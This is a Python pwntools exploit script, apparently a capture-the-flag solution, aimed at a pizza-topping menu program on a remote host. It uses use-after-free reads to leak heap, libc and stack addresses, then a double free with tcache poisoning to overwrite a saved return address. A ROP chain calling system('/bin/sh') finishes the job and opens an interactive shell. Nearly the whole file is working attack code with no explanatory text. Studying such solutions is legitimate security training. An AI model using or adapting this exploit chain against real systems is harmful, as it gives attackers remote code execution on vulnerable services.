#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched",checksec=False)
ld = ELF("./ld-linux-x86-64.so.2",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
context.binary = exe


Tomato  = b"Tomato"
Onion    = b"Onion"
Capsicum      = b"Capsicum"
Corn       = b"Corn"
Mushroom    = b"Mushroom"
Pineapple   = b"Pineapple"
Olives      = b"Olives"
Cheese      = b"Double Cheese"
Paneer      = b"Paneer"
Chicken      = b"Chicken"

    
def GDB():
    gdb.attach(p,gdbscript='''
    # b* verify_topping
    #b* customize_topping
    #b* add_topping
    c
    ''')
    input()


def add(topping,size):
    p.sendlineafter(b"Enter your choice :",b"1")
    p.sendlineafter(b"Which topping ?",topping)
    p.sendlineafter(b"How much ?",f"{size}".encode())


def custom(toping,data):
    p.sendlineafter(b"Enter your choice :",b"2")
    p.sendlineafter(b"Which one to customize ?",toping)
    p.sendlineafter(b"Enter new modified topping : ",data)

def free(topping):
    p.sendlineafter(b"Enter your choice :",b"3")
    p.sendlineafter(b"Which topping to remove ?",topping)

def view(topping):
    p.sendlineafter(b"Enter your choice :",b"4")
    p.sendlineafter(b"Which topping to verify ?",topping)
# p = process(exe.path)
# GDB()
p = remote("34.70.212.151", 8007)
add(Tomato, 63)
add(Onion, 63)
add(Capsicum, 63)    
add(Corn, 63) 
add(Mushroom, 63 ) 
add(Pineapple , 63) 
add(Olives , 63) 
add(Cheese, 63 )    
add(Paneer , 63) 
add(Chicken,63)

free(Tomato)
view(Tomato)
p.recvline()
heap = int.from_bytes(p.recvline()[:-1],"little") << 12
log.info(['[+]HEAP BASE:'+hex(heap)])

free(Onion)
free(Capsicum)
free(Corn)
free(Mushroom)
free(Pineapple)
free(Olives)
free(Cheese)

print("leaking libc")
view(Cheese)
p.recvline()
leak = int.from_bytes(p.recvline()[:-1],"little")
libc.address = leak - 0x219ce0
log.info('[+]LIB BASE:'+hex(libc.address))
rdx = libc.address + 0x00000000000796a2
rdi = libc.address + 0x000000000002a3e5
rsi = libc.address + 0x000000000002be51
ret = rdi + 1
rsp = libc.address + 0x0000000000035732

add(Tomato,14)
add(Onion,14)
add(Capsicum,14)    
add(Corn,14) 
add(Mushroom,14 ) 
add(Pineapple ,14) 
add(Olives ,14) 
add(Cheese,14 )    
add(Paneer ,14) 
add(Chicken,14)

free(Tomato)
free(Onion)
free(Capsicum)
free(Corn)
free(Mushroom)
free(Pineapple)
free(Olives)
free(Cheese)
free(Paneer)
free(Cheese)





for i in range(8):
    add(Tomato,14)

print("leaking stack")

payload = p64(((heap+0x1820)>> 12) ^ libc.sym['environ'])
custom(Tomato,payload)
add(Tomato,14)
add(Tomato,14)
add(Tomato,14)
view(Tomato)
p.recvline()
stack = int.from_bytes(p.recvline()[:-1],"little")
log.info('[+]Stack:'+hex(stack))
saved_rip = stack - 0x270 - 0x38


add(Tomato,10)
add(Onion,10)
add(Capsicum,10)    
add(Corn,10) 
add(Mushroom,10 ) 
add(Pineapple ,10) 
add(Olives ,10) 
add(Cheese,10 )    
add(Paneer ,10) 
add(Chicken,10)

free(Tomato)
free(Onion)
free(Capsicum)
free(Corn)
free(Mushroom)
free(Pineapple)
free(Olives)
free(Cheese)
free(Paneer)
free(Cheese)


print("leaking ropping")

for i in range(8):
    add(Tomato,10)
payload = p64(((heap+0x1ca0)>> 12) ^ (saved_rip))
custom(Tomato,payload)
add(Onion,10)
ROP = flat(
    rdi,next(libc.search(b"/bin/sh\x00")),
    rsi,0,
    rdx,0,
    libc.sym['system']
)
input("enter")
custom(Onion,ROP)
add(Tomato,10)

add(Tomato,10)
ROP = flat(
    rsp,heap + 0x1ca0 ,
)
custom(Tomato,b"A"*0x38+ROP)

p.interactive()
